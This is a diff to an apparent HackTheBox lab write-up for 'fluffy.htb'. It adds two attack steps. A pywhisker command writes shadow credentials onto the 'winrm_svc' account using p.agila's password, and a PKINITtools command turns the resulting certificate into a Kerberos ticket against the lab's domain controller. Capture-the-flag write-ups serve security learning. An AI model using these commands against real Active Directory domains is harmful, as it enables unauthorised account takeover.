@@ -191,8 +191,12 @@ So our first course of action is to add our `p.agila` user to the SERVICE ACCOUN
 
  13. We'll perform this attack using `pywhisker`
 
-``
+`python3 ~/tools/pywhisker/pywhisker/pywhisker.py -d fluffy.htb -u p.agila -p $(cat creds/p.agila.pass) --target 'winrm_svc' --action 'add' --filename winrm_svc -P 'P@ssw0rd!'`
 
 <img width="1072" height="394" alt="image" src="https://github.com/user-attachments/assets/cd6af788-ca26-42e1-a6d8-9d7155ed4569" />
 
-14. 
+14. With the pfx certificate, we can request for a TGT for user `WINRM_SVC`
+
+`python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx winrm_svc.pfx -pfx-pass 'P@ssw0rd!' fluffy.htb/winrm_svc -dc-ip 10.129.232.88 winrm_svc.ccache`
+
+
